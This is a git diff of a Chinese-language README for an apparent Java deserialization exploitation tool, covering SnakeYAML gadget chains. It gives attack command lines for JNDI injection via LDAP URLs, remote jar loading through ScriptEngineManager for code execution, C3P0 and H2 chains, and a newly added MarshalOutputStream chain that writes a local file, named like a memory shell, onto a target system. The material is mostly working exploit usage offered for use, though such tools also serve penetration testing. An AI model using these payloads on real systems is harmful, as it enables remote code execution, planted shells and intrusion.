@@ -1290,7 +1290,7 @@ SnakeYaml系列的一些打法可以参考我写的这篇文章：[2023 华北�
 -m SnakeYamlAttack -g FindClassByDNS -a "java.lang.String|emdzjnwvao.zaza.eu.org"
 ```
 
-### **JdbcRowSetImpl**
+### JdbcRowSetImpl
 
 描述：使用JDK的JdbcRowSetImpl类来触发JNDI注入
 
@@ -1300,14 +1300,16 @@ SnakeYaml系列的一些打法可以参考我写的这篇文章：[2023 华北�
 -m SnakeYamlAttack -g JdbcRowSetImpl -a "ldap://127.0.0.1:1389/"
 ```
 
-### **ScriptEngineManager**
+### ScriptEngineManager
 
-描述：使用JavaScript引擎远程加载jar包来RCE，jar包的构造参考这个项目：[https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)。该SPI攻击手法由于第一次加载后会将类加载到jvm中，所以有漏洞利用需求变化类字节码时要更改类名
+描述：使用JavaScript引擎来加载jar包来RCE，jar包的构造参考这个项目：[https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)。该SPI攻击手法由于第一次加载后会将类加载到jvm中，所以有漏洞利用需求变化类字节码时要更改类名
 
-工具：args参数中写远程类加载的地址，可以在ThirdPartyAttack模块生成jarPayload然后开启监听，进行漏洞利用
+工具：args参数中写加载jar包的地址。如果是远程加载jar包可以使用ThirdPartyAttack模块生成jarPayload然后开启监听，进行漏洞利用。如果是不出网环境想本地加载jar包，可以使用SnakeYaml的MarshalOutputStream链写文件然后在本地加载进行漏洞利用。
 
 ```java
 -m SnakeYamlAttack -g ScriptEngineManager -a "http://127.0.0.1:2333/yaml-payload.jar"
+    
+-m SnakeYamlAttack -g ScriptEngineManager -a "file:///success.jar"
 ```
 
 使用ThirdPartyAttack模块生成jarPayload：
@@ -1316,7 +1318,7 @@ SnakeYaml系列的一些打法可以参考我写的这篇文章：[2023 华北�
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -jarPayload "ScriptEngineFactory" -writeToFile "/tmp/"
 ```
 
-### **C3P0-JNDI利用链**
+### C3P0-JNDI利用链
 
 描述：SnakeYaml反序列化利用JndiRefForwardingDataSource类触发jndi注入
 
@@ -1326,7 +1328,7 @@ SnakeYaml系列的一些打法可以参考我写的这篇文章：[2023 华北�
 -m SnakeYamlAttack -g C3P0_JNDI -a "ldap://127.0.0.1:1389/"
 ```
 
-### **C3P0-Yso利用链**
+### C3P0-Yso利用链
 
 描述：在C3P0依赖中的com.mchange.v2.c3p0.WrapperConnectionPoolDataSource类在反序列化过程中会对userOverridesAsString属性值进行Java反序列化
 
@@ -1344,6 +1346,27 @@ SnakeYaml系列的一些打法可以参考我写的这篇文章：[2023 华北�
 
 ```java
 -m SnakeYamlAttack -g H2DataBase -a "H2CreateAlias:auto_cmd:calc"
+```
+
+###  MarshalOutputStream 利用链
+
+描述：该利用链学习参考：[从HertzBeat聊聊SnakeYAML反序列化](https://mp.weixin.qq.com/s/m8lQmnBUNRYuN1Mv4J5_ng)。MarshalOutputStream 利用链是条JDK写文件的利用链：
+
+- 该Payload可以分为4层：三个构造方法和 java.util.zip.Inflater 的 setInput 方法
+- `!!java.io.File`写入文件的目录必须要存在
+- `!!binary`的值是经过Inflater压缩后Base64编码后的内容
+
+```
+sun.rmi.server.MarshalOutputStream(OutputStream var1)
+java.util.zip.InflaterOutputStream(OutputStream out, Inflater infl, int bufLen)
+	java.io.FileOutputStream(File file, boolean append)
+	java.util.zip.Inflater().setInput(byte[] b, int off, int len)
+```
+
+工具：最后写文件的格式为：`{source.file}|{destation.file}`，工具会读取source.file也就是你本地这个文件的内容，然后写入目标系统的文件是destation.file。在目标是windows系统中工具的destation.file参数必须用`\\`来分割目录和文件，因为该利用链的Payload中文件路径在Windows系统中要用`\\`分割。
+
+```
+-m SnakeYamlAttack -g MarshalOutputStream -a "C:\Users\butler\Desktop\Memshell\EncryptionUtil.class|D:\\04Testing\\Memshell\\EncryptionUtil.class"
 ```
 
 ## 5.Shiro550反序列化(YsoAttack)
